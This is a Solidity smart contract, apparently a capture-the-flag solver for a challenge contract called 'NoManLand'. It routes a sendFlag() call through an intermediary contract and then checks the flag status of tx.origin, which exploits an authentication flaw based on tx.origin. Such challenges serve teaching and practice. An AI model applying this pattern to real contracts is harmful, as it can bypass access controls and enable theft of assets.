// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./NoManLand.sol";

contract Solver {
    NoManLand public victimContract;


    constructor(address victimAddress){
        victimContract=NoManLand(victimAddress);
    }

    function getFlag() public returns (bool){
        victimContract.sendFlag();
        return victimContract.canGetFlag(tx.origin);
    }
}

